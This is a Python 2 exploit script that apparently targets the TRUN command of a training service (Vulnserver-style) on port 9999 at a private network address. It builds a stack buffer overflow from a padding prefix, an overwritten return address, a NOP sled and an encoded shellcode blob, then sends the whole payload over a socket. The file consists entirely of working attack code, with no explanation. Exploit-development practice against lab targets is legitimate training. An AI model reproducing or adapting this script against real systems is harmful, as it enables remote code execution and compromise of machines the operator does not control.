#!/usr/bin/python2
import socket
server = '192.168.1.162'
sport = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
buf =  b""
buf += b"\xbd\xdc\xb6\xe6\x8d\xd9\xec\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x52\x83\xee\xfc\x31\x6e\x0e\x03\xb2"
buf += b"\xb8\x04\x78\xb6\x2d\x4a\x83\x46\xae\x2b\x0d\xa3"
buf += b"\x9f\x6b\x69\xa0\xb0\x5b\xf9\xe4\x3c\x17\xaf\x1c"
buf += b"\xb6\x55\x78\x13\x7f\xd3\x5e\x1a\x80\x48\xa2\x3d"
buf += b"\x02\x93\xf7\x9d\x3b\x5c\x0a\xdc\x7c\x81\xe7\x8c"
buf += b"\xd5\xcd\x5a\x20\x51\x9b\x66\xcb\x29\x0d\xef\x28"
buf += b"\xf9\x2c\xde\xff\x71\x77\xc0\xfe\x56\x03\x49\x18"
buf += b"\xba\x2e\x03\x93\x08\xc4\x92\x75\x41\x25\x38\xb8"
buf += b"\x6d\xd4\x40\xfd\x4a\x07\x37\xf7\xa8\xba\x40\xcc"
buf += b"\xd3\x60\xc4\xd6\x74\xe2\x7e\x32\x84\x27\x18\xb1"
buf += b"\x8a\x8c\x6e\x9d\x8e\x13\xa2\x96\xab\x98\x45\x78"
buf += b"\x3a\xda\x61\x5c\x66\xb8\x08\xc5\xc2\x6f\x34\x15"
buf += b"\xad\xd0\x90\x5e\x40\x04\xa9\x3d\x0d\xe9\x80\xbd"
buf += b"\xcd\x65\x92\xce\xff\x2a\x08\x58\x4c\xa2\x96\x9f"
buf += b"\xb3\x99\x6f\x0f\x4a\x22\x90\x06\x89\x76\xc0\x30"
buf += b"\x38\xf7\x8b\xc0\xc5\x22\x1b\x90\x69\x9d\xdc\x40"
buf += b"\xca\x4d\xb5\x8a\xc5\xb2\xa5\xb5\x0f\xdb\x4c\x4c"
buf += b"\xd8\x24\x38\x4f\x7c\xcd\x3b\x4f\x7d\xb6\xb5\xa9"
buf += b"\x17\xd8\x93\x62\x80\x41\xbe\xf8\x31\x8d\x14\x85"
buf += b"\x72\x05\x9b\x7a\x3c\xee\xd6\x68\xa9\x1e\xad\xd2"
buf += b"\x7c\x20\x1b\x7a\xe2\xb3\xc0\x7a\x6d\xa8\x5e\x2d"
buf += b"\x3a\x1e\x97\xbb\xd6\x39\x01\xd9\x2a\xdf\x6a\x59"
buf += b"\xf1\x1c\x74\x60\x74\x18\x52\x72\x40\xa1\xde\x26"
buf += b"\x1c\xf4\x88\x90\xda\xae\x7a\x4a\xb5\x1d\xd5\x1a"
buf += b"\x40\x6e\xe6\x5c\x4d\xbb\x90\x80\xfc\x12\xe5\xbf"
buf += b"\x31\xf3\xe1\xb8\x2f\x63\x0d\x13\xf4\x83\xec\xb1"
buf += b"\x01\x2c\xa9\x50\xa8\x31\x4a\x8f\xef\x4f\xc9\x25"
buf += b"\x90\xab\xd1\x4c\x95\xf0\x55\xbd\xe7\x69\x30\xc1"
buf += b"\x54\x89\x11"
padding = 'F' * (3000 - 2006 - 4 - 16 - len(buf))
attack = prefix + eip + nopsled + buf + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()

